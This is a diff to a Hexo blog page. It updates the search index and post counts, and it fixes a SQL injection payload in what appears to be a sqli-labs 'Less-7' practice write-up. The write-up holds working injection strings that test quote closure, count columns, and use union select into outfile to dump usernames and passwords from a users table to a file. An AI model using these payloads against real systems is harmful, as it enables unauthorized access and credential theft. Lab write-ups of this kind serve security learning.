@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"php","path":"2025/10/05/php/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
+  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"ISCTF 复现","path":"2026/01/16/ISCTF-复现/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"php","path":"2025/10/05/php/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"极客大挑战2025 web复现","path":"2026/01/16/极客大挑战2025-web复现/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -270,7 +270,7 @@
         </a>
         <a href="/archives">
           <div>
-            <span>4 </span>
+            <span>5 </span>
             <span>归档</span>
           </div>
         </a>
@@ -327,7 +327,7 @@
       </h5>
       <p class="main-left--subtitle">
         <span>文章数目：</span>
-        <span>6 篇</span>
+        <span>8 篇</span>
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>7030天</span>
+        <span>7103天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -438,7 +438,7 @@
 <h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><img src="https://github.com/Lin060807/images/raw/main/Less-7.png" alt="Less-7"><br>1.测试闭合方式<br>输入?id&#x3D;1’ –+ 和?id&#x3D;1’) –+都报错，不是单引号和单引号加括号闭合<br>输入?id&#x3D;1” –+ 和?id&#x3D;1’)) –+不报错，但输入?id&#x3D;1” and 1&#x3D;2 –+时不报错，说明双引号可能被两个单引号包裹，不是双引号闭合<br>而?id&#x3D;1’)) and 1&#x3D;2 –+报错，说明是’))闭合<br>2.查列数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) group by 3 --+</span></span><br></pre></td></tr></table></figure>
 <p>3.测试查询语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union by 1,2,3 into outfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\text.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,3 into outfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\text.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
 <p>会生成一个text文件里面包含回显内容<br><img src="https://github.com/Lin060807/images/raw/main/Less-7(1).png" alt="Less-7(1)"><br>之后可以生成不同文件完成查询表、列，最后用</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,group_concat(username,password) from users into outfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\2text.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/Lin060807/images/raw/main/Less-7(2).png" alt="Less-7"></p>
